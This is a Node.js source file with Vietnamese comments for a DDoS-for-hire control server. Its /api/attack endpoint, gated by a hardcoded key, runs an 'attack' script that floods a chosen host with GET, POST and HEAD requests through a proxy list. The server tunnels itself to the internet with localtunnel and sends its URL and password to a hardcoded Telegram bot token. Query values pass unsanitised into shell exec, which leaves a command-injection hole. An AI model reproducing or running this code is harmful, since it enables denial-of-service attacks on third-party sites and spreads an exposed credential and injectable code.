const express = require("express");
const { exec } = require("child_process");
const localtunnel = require("localtunnel");
const axios = require("axios");
const app = express();
const MAX_CONCURRENT_ATTACKS = 1;

let activeAttacks = 0;
let currentPID = null;

// Hàm tạo cổng ngẫu nhiên
const getRandomPort = () => {
  return Math.floor(Math.random() * (65535 - 1024) + 1024);
};

const validateInput = ({ key, host, time, method, port }) => {
  if (![key, host, time, method, port].every(Boolean)) return "THIẾU THAM SỐ";
  if (key !== "negan") return "KEY KHÔNG HỢP LỆ";
  if (time > 200) return "THỜI GIAN PHẢI < 200S";
  if (port < 1 || port > 65535) return "CỔNG KHÔNG HỢP LỆ";
  return null;
};

const executeAttack = (command) => {
  return new Promise((resolve, reject) => {
    const childProcess = exec(command, (error, stdout, stderr) => {
      if (stderr) {
        console.error(stderr);
        reject(stderr);
      } else {
        resolve(stdout);
      }
    });

    // Lưu PID của tiến trình
    currentPID = childProcess.pid;

    // Khi tiến trình kết thúc, giải phóng slot
    childProcess.on("close", () => {
      activeAttacks--;
      currentPID = null;
      console.log(`Tiến trình ${currentPID} đã kết thúc. Slot được giải phóng.`);
    });
  });
};

const executeAllAttacks = (methods, host, time) => {
  const commands = methods.map((method) => {
    return `node attack -m ${method} -u ${host} -s ${time} -p live.txt --full true`;
  });

  // Thực thi tất cả các lệnh tấn công song song mà không chờ kết quả
  commands.forEach(executeAttack);
};

// Hàm gửi tin nhắn đến Telegram bot
const sendTelegramMessage = async (message) => {
  const token = "7588647057:AAEAeQ5Ft44mFiT5tzTEVw170pvSMsj1vJw";
  const chatId = "7371969470";
  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  try {
    await axios.post(url, {
      chat_id: chatId,
      text: message,
    });
  } catch (error) {
    console.error("Lỗi khi gửi tin nhắn đến Telegram:", error);
  }
};

// Hàm lấy mật khẩu từ localtunnel
const getLocaltunnelPassword = async () => {
  try {
    const response = await axios.get("https://loca.lt/mytunnelpassword");
    return response.data.trim(); // Trả về mật khẩu đã được cắt bỏ khoảng trắng thừa
  } catch (error) {
    console.error("Lỗi khi lấy mật khẩu từ localtunnel:", error);
    return null;
  }
};

// Khởi động server với cổng ngẫu nhiên
const startServer = async () => {
  const port = getRandomPort();
  const tunnel = await localtunnel({ port });

  // Lấy mật khẩu từ localtunnel
  const password = await getLocaltunnelPassword();

  app.listen(port, () => {
    console.log(`[API SERVER] CHẠY TẠI CỔNG ${port}`);
    console.log(`[LOCALTUNNEL] URL: ${tunnel.url}`);

    // Gửi URL và mật khẩu đăng nhập về Telegram
    const message = `API Server đã khởi động:\nURL: ${tunnel.url}\nMật khẩu: ${password}`;
    sendTelegramMessage(message);
  });

  tunnel.on("close", () => {
    console.log("Localtunnel đã đóng.");
  });
};

app.get("/api/attack", (req, res) => {
  const { key, host, time, method, port, modul } = req.query;

  if (activeAttacks >= MAX_CONCURRENT_ATTACKS || currentPID) {
    return res.status(400).json({ status: "ERROR", message: "ĐANG CÓ CUỘC TẤN CÔNG KHÁC", statusCode: 400 });
  }

  const validationMessage = validateInput({ key, host, time, method, port });
  if (validationMessage) {
    return res.status(400).json({ status: "ERROR", message: validationMessage, statusCode: 400 });
  }

  activeAttacks++;

  if (modul === "FULL") {
    const methods = ["GET", "POST", "HEAD"];
    executeAllAttacks(methods, host, time);  // Chạy đồng thời các lệnh tấn công mà không chờ kết quả
    res.status(200).json({ 
      status: "SUCCESS", 
      message: "LỆNH TẤN CÔNG (GET, POST, HEAD) ĐÃ GỬI", 
      host, 
      port, 
      time, 
      modul: "GET POST HEAD", 
      method: "attack", 
      pid: currentPID 
    });
  } else {
    const command = `node attack -m ${modul} -u ${host} -s ${time} -p live.txt --full true`;
    executeAttack(command);  // Chạy tấn công cho modul không phải FULL
    res.status(200).json({ 
      status: "SUCCESS", 
      message: "LỆNH TẤN CÔNG ĐÃ GỬI", 
      host, 
      port, 
      time, 
      modul, 
      method: "attack", 
      pid: currentPID 
    });
  }
});

// Khởi động server
startServer();
